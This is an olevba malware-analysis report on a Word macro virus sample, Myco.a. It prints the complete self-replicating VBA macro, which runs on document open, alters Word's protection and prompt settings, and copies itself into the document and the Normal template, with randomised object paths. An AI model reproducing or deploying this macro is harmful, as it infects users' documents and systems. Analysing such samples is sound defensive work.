olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Myco.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Myco.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Dim A(1 To 39) As String
A(1) = "ActiveDocument"
A(2) = "Word.ActiveDocument"
A(3) = "Application.ActiveDocument"
A(4) = "Word.Application.ActiveDocument"
A(5) = "System.Application.ActiveDocument"
A(6) = "AddIns.Application.ActiveDocument"
A(7) = "Bookmarks.Application.ActiveDocument"
A(8) = "Documents.Application.ActiveDocument"
A(9) = "Word.System.Application.ActiveDocument"
A(10) = "NormalTemplate"
A(11) = "Word.NormalTemplate"
A(12) = "Application.NormalTemplate"
A(13) = "Word.Application.NormalTemplate"
A(14) = "System.Application.NormalTemplate"
A(15) = "AddIns.Application.NormalTemplate"
A(16) = "Bookmarks.Application.NormalTemplate"
A(17) = "Documents.Application.NormalTemplate"
A(18) = "Word.System.Application.NormalTemplate"
A(19) = "Options"
A(20) = "Word.Options"
A(21) = "Application.Options"
A(22) = "Word.Application.Options"
A(23) = ".VBProject.VBComponents(1)"
A(24) = ".VBProject.VBComponents.Item(1)"
A(25) = ".VBProject.VBComponents(""ThisDocument"")"
A(26) = ".VBProject.VBComponents.Item(""ThisDocument"")"
A(27) = "0"
A(28) = "Yes"
A(29) = "True "
A(30) = "False"
A(31) = "MyCode = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 41) & vbCrLf & A(31) & vbCrLf & A(32) & vbCrLf & A(33) & vbCrLf & A(34) & vbCrLf & A(35) & vbCrLf & A(36) & vbCrLf & A(37) & vbCrLf & A(38) & vbCrLf & A(39) & vbCrLf & ""End Sub"""
A(32) = A(Int((Rnd * 3) + 19)) & ".VirusProtection = " & A(Int((Rnd * 3) + 27))
A(33) = A(Int((Rnd * 3) + 19)) & ".SaveNormalPrompt = " & A(Int((Rnd * 3) + 27))
A(34) = A(Int((Rnd * 3) + 19)) & ".ConfirmConversions = " & A(Int((Rnd * 3) + 27))
A(35) = A(Int((Rnd * 8) + 1)) & A(Int((Rnd * 3) + 23)) & ".CodeModule.DeleteLines 1, " & A(Int((Rnd * 8) + 1)) & A(Int((Rnd * 3) + 23)) & ".CodeModule.CountOfLines"
A(36) = A(Int((Rnd * 8) + 1)) & A(Int((Rnd * 3) + 23)) & ".CodeModule.AddFromString MyCode"
A(37) = A(Int((Rnd * 8) + 10)) & A(Int((Rnd * 3) + 23)) & ".CodeModule.DeleteLines 1, " & A(Int((Rnd * 8) + 10)) & A(Int((Rnd * 3) + 23)) & ".CodeModule.CountOfLines"
A(38) = A(Int((Rnd * 8) + 10)) & A(Int((Rnd * 3) + 23)) & ".CodeModule.AddFromString MyCode"
A(39) = A(Int((Rnd * 8) + 1)) & ".SaveAs FileName:=" & A(Int((Rnd * 8) + 1)) & ".FullName"
MyCode = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 41) & vbCrLf & A(31) & vbCrLf & A(32) & vbCrLf & A(33) & vbCrLf & A(34) & vbCrLf & A(35) & vbCrLf & A(36) & vbCrLf & A(37) & vbCrLf & A(38) & vbCrLf & A(39) & vbCrLf & "End Sub"
Word.Options.VirusProtection = True 
Application.Options.SaveNormalPrompt = 0
Application.Options.ConfirmConversions = Yes
System.Application.ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Word.Application.ActiveDocument.VBProject.VBComponents(1).CodeModule.AddFromString MyCode
System.Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Application.NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
Bookmarks.Application.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromString MyCode
System.Application.ActiveDocument.SaveAs FileName:=Documents.Application.ActiveDocument.FullName
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

